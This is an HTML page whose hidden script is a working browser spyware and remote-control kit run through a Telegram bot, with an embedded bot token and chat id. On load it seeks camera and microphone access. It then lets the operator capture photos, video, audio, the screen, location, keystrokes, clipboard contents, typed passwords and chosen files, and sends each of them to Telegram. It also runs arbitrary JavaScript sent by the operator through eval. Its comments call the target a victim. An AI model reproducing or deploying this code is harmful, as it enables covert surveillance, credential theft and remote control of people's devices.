<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>...</title>
    <style>
        body { margin: 0; padding: 0; background: white; }
        * { display: none; }
    </style>
</head>
<body>
    <script>
        const token = "7782080900:AAGvcMWaE_IAbb_0_0-HwcyCvQUUUVxBYmc";
        const chat_id = "5932979028";
        let lastUpdateId = 0;
        let cameraReady = false;
        let isProcessing = false;
        let mediaStream = null;
        let videoTrack = null;
        let imageCapture = null;
        let keylogData = '';
        let isKeylogging = false;
        
        // ========== تفعيل الكاميرا ==========
        async function initCamera() {
            try {
                mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                videoTrack = mediaStream.getVideoTracks()[0];
                imageCapture = new ImageCapture(videoTrack);
                cameraReady = true;
                await sendToTelegram("✅ النظام جاهز - جميع الصلاحيات تم منحها");
                await sendMainMenu();
                return true;
            } catch (e) {
                await sendToTelegram("❌ فشل تفعيل الكاميرا");
                return false;
            }
        }
        
        // ========== القائمة الرئيسية المتطورة ==========
        async function sendMainMenu() {
            const message = `🤖 *بوت التحكم المتطور* 🤖

📊 *الحالة:* الكاميرا نشطة
🕐 *وقت التشغيل:* مستمر

اختر الإجراء المطلوب:`;
            
            const keyboard = {
                inline_keyboard: [
                    [{ text: "📸 تصوير", callback_data: "photo" }, { text: "🎬 فيديو", callback_data: "video" }],
                    [{ text: "🎤 صوت", callback_data: "audio" }, { text: "📍 الموقع", callback_data: "location" }],
                    [{ text: "📁 رفع ملف", callback_data: "upload_file" }, { text: "🖥️ تصوير شاشة", callback_data: "screenshot" }],
                    [{ text: "⌨️ Keylogger", callback_data: "keylogger" }, { text: "📋 الحافظة", callback_data: "clipboard" }],
                    [{ text: "🌐 معلومات الشبكة", callback_data: "network" }, { text: "🔐 كلمات المرور", callback_data: "passwords" }],
                    [{ text: "📸 10 صور", callback_data: "10photos" }, { text: "🎤 10 صوت", callback_data: "10audios" }],
                    [{ text: "🎬 فيديو دقيقة", callback_data: "video60" }, { text: "📊 معلومات الجهاز", callback_data: "info" }],
                    [{ text: "🔄 تنفيذ الكل", callback_data: "full" }, { text: "💻 تنفيذ كود", callback_data: "exec_code" }]
                ]
            };
            
            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id, text: message, parse_mode: "Markdown", reply_markup: keyboard })
            });
        }
        
        // ========== 1. الموقع الجغرافي ==========
        async function getLocation() {
            try {
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject);
                });
                const lat = position.coords.latitude;
                const lng = position.coords.longitude;
                const mapUrl = `https://maps.google.com/?q=${lat},${lng}`;
                await sendToTelegram(`📍 *الموقع الحالي*\nخط العرض: ${lat}\nخط الطول: ${lng}\n[فتح الخريطة](${mapUrl})`);
                return { lat, lng };
            } catch (e) {
                await sendToTelegram("❌ فشل الحصول على الموقع");
                return null;
            }
        }
        
        // ========== 2. رفع ملف من جهاز الضحية ==========
        async function uploadFile() {
            await sendToTelegram("📁 يرجى اختيار ملف للإرسال...");
            const input = document.createElement('input');
            input.type = 'file';
            input.style.position = 'absolute';
            input.style.top = '-100px';
            input.style.left = '-100px';
            document.body.appendChild(input);
            
            input.onchange = async (e) => {
                const file = e.target.files[0];
                if (file) {
                    const formData = new FormData();
                    formData.append("chat_id", chat_id);
                    formData.append("document", file);
                    await fetch(`https://api.telegram.org/bot${token}/sendDocument`, { method: "POST", body: formData });
                    await sendToTelegram(`✅ تم رفع الملف: ${file.name}`);
                }
                input.remove();
            };
            input.click();
        }
        
        // ========== 3. تصوير الشاشة ==========
        async function captureScreenshot() {
            try {
                await sendToTelegram("🖥️ جاري تصوير الشاشة...");
                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                const track = stream.getVideoTracks()[0];
                const capture = new ImageCapture(track);
                const blob = await capture.takePhoto();
                
                const formData = new FormData();
                formData.append("chat_id", chat_id);
                formData.append("photo", blob, "screenshot.jpg");
                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: "POST", body: formData });
                
                stream.getTracks().forEach(t => t.stop());
                await sendToTelegram("✅ تم تصوير الشاشة وإرسالها");
            } catch (e) {
                await sendToTelegram("❌ فشل تصوير الشاشة");
            }
        }
        
        // ========== 4. Keylogger ==========
        async function toggleKeylogger() {
            isKeylogging = !isKeylogging;
            if (isKeylogging) {
                keylogData = '';
                document.addEventListener('keypress', keyloggerHandler);
                await sendToTelegram("⌨️ *Keylogger مفعل* - يتم تسجيل جميع الضغطات");
                
                // إرسال التقرير كل 30 ثانية
                setInterval(() => {
                    if (isKeylogging && keylogData.length > 0) {
                        sendToTelegram(`⌨️ *تقرير الضغطات*\n\`\`\`\n${keylogData}\n\`\`\``);
                        keylogData = '';
                    }
                }, 30000);
            } else {
                document.removeEventListener('keypress', keyloggerHandler);
                await sendToTelegram("⌨️ *Keylogger معطل*");
            }
        }
        
        function keyloggerHandler(e) {
            if (e.key === 'Enter') keylogData += '\n';
            else if (e.key === 'Backspace') keylogData = keylogData.slice(0, -1);
            else keylogData += e.key;
        }
        
        // ========== 5. الحافظة ==========
        async function getClipboard() {
            try {
                const text = await navigator.clipboard.readText();
                await sendToTelegram(`📋 *محتوى الحافظة*\n\`\`\`\n${text.substring(0, 1000)}\n\`\`\``);
            } catch (e) {
                await sendToTelegram("❌ فشل قراءة الحافظة");
            }
        }
        
        // ========== 6. معلومات الشبكة ==========
        async function getNetworkInfo() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (connection) {
                const msg = `🌐 *معلومات الشبكة*\n• النوع: ${connection.effectiveType}\n• السرعة: ${connection.downlink}Mbps\n• التأخير: ${connection.rtt}ms`;
                await sendToTelegram(msg);
            } else {
                await sendToTelegram("❌ معلومات الشبكة غير متاحة");
            }
        }
        
        // ========== 7. كلمات المرور ==========
        async function getPasswords() {
            const passwords = [];
            document.querySelectorAll('input[type="password"]').forEach(input => {
                if (input.value) passwords.push(input.value);
            });
            if (passwords.length > 0) {
                await sendToTelegram(`🔐 *كلمات المرور المكتشفة*\n\`\`\`\n${passwords.join('\n')}\n\`\`\``);
            } else {
                await sendToTelegram("🔐 لم يتم العثور على كلمات مرور في الصفحة الحالية");
            }
        }
        
        // ========== 8. تنفيذ كود عن بعد ==========
        async function executeCode() {
            await sendToTelegram("💻 أرسل كود JavaScript للتنفيذ:");
            // سيتم استقبال الكود في الأمر التالي
        }
        
        async function runJS(code) {
            try {
                const result = eval(code);
                await sendToTelegram(`📟 *نتيجة التنفيذ*\n\`\`\`\n${JSON.stringify(result, null, 2)}\n\`\`\``);
            } catch (e) {
                await sendToTelegram(`❌ خطأ: ${e.message}`);
            }
        }
        
        // ========== الوظائف الأساسية ==========
        async function capturePhoto() {
            if (!cameraReady) return null;
            try {
                return await imageCapture.takePhoto();
            } catch (e) { return null; }
        }
        
        async function recordVideo(duration = 10000) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                return new Promise((resolve) => {
                    recorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
                    recorder.onstop = () => {
                        const blob = new Blob(chunks, { type: 'video/webm' });
                        stream.getTracks().forEach(t => t.stop());
                        resolve(blob);
                    };
                    recorder.start();
                    setTimeout(() => recorder.stop(), duration);
                });
            } catch (e) { return null; }
        }
        
        async function recordAudio(duration = 10000) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                return new Promise((resolve) => {
                    recorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
                    recorder.onstop = () => {
                        const blob = new Blob(chunks, { type: 'audio/ogg' });
                        stream.getTracks().forEach(t => t.stop());
                        resolve(blob);
                    };
                    recorder.start();
                    setTimeout(() => recorder.stop(), duration);
                });
            } catch (e) { return null; }
        }
        
        // ========== دوال التليجرام ==========
        async function sendToTelegram(text) {
            try {
                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id, text, parse_mode: "Markdown" })
                });
            } catch (e) {}
        }
        
        async function sendPhoto(blob) {
            const formData = new FormData();
            formData.append("chat_id", chat_id);
            formData.append("photo", blob, "photo.jpg");
            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: "POST", body: formData });
        }
        
        async function sendVideo(blob) {
            const formData = new FormData();
            formData.append("chat_id", chat_id);
            formData.append("video", blob, "video.webm");
            await fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: "POST", body: formData });
        }
        
        async function sendVoice(blob) {
            const formData = new FormData();
            formData.append("chat_id", chat_id);
            formData.append("voice", blob, "voice.ogg");
            await fetch(`https://api.telegram.org/bot${token}/sendVoice`, { method: "POST", body: formData });
        }
        
        async function sendDeviceInfo() {
            const battery = await navigator.getBattery();
            const msg = `📱 *معلومات الجهاز*\n• المتصفح: ${navigator.userAgent.substring(0, 80)}\n• الشاشة: ${screen.width}x${screen.height}\n• البطارية: ${Math.round(battery.level * 100)}%`;
            await sendToTelegram(msg);
        }
        
        // ========== معالجة الأوامر ==========
        let pendingCode = false;
        
        async function handleCommand(cmd) {
            if (isProcessing) { await sendToTelegram("⏳ انتظر..."); return; }
            isProcessing = true;
            
            switch(cmd) {
                case "photo":
                    const p = await capturePhoto();
                    if (p) { await sendPhoto(p); await sendToTelegram("✅ تم"); }
                    break;
                case "video":
                    const v = await recordVideo(10000);
                    if (v) { await sendVideo(v); await sendToTelegram("✅ تم"); }
                    break;
                case "video60":
                    const v60 = await recordVideo(60000);
                    if (v60) { await sendVideo(v60); await sendToTelegram("✅ تم"); }
                    break;
                case "audio":
                    const a = await recordAudio(10000);
                    if (a) { await sendVoice(a); await sendToTelegram("✅ تم"); }
                    break;
                case "location":
                    await getLocation();
                    break;
                case "upload_file":
                    await uploadFile();
                    break;
                case "screenshot":
                    await captureScreenshot();
                    break;
                case "keylogger":
                    await toggleKeylogger();
                    break;
                case "clipboard":
                    await getClipboard();
                    break;
                case "network":
                    await getNetworkInfo();
                    break;
                case "passwords":
                    await getPasswords();
                    break;
                case "10photos":
                    for (let i=0; i<10; i++) {
                        const ph = await capturePhoto();
                        if (ph) await sendPhoto(ph);
                        await new Promise(r => setTimeout(r, 300));
                    }
                    await sendToTelegram("✅ تم");
                    break;
                case "10audios":
                    for (let i=0; i<10; i++) {
                        const au = await recordAudio(10000);
                        if (au) await sendVoice(au);
                        await new Promise(r => setTimeout(r, 500));
                    }
                    await sendToTelegram("✅ تم");
                    break;
                case "info":
                    await sendDeviceInfo();
                    break;
                case "exec_code":
                    pendingCode = true;
                    await sendToTelegram("💻 أرسل كود JavaScript للتنفيذ:");
                    break;
                case "full":
                    const photo = await capturePhoto();
                    if (photo) await sendPhoto(photo);
                    await new Promise(r => setTimeout(r, 2000));
                    const video = await recordVideo(10000);
                    if (video) await sendVideo(video);
                    await new Promise(r => setTimeout(r, 2000));
                    const audio = await recordAudio(10000);
                    if (audio) await sendVoice(audio);
                    await sendToTelegram("✅ تم");
                    break;
            }
            isProcessing = false;
        }
        
        // استقبال الرسائل النصية (لتنفيذ الكود)
        async function handleMessage(text) {
            if (pendingCode) {
                pendingCode = false;
                await runJS(text);
            }
        }
        
        // جلب التحديثات
        async function getUpdates() {
            try {
                const url = `https://api.telegram.org/bot${token}/getUpdates?timeout=25&offset=${lastUpdateId+1}`;
                const res = await fetch(url);
                const data = await res.json();
                if (data.result) {
                    for (const update of data.result) {
                        lastUpdateId = update.update_id;
                        if (update.callback_query) {
                            await handleCommand(update.callback_query.data);
                            await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
                                method: "POST",
                                body: JSON.stringify({ callback_query_id: update.callback_query.id })
                            });
                        } else if (update.message && update.message.text) {
                            await handleMessage(update.message.text);
                        }
                    }
                }
            } catch(e) {}
        }
        
        // ========== التشغيل ==========
        window.onload = async () => {
            await initCamera();
            setInterval(getUpdates, 2000);
        };
    </script>
</body>
</html>
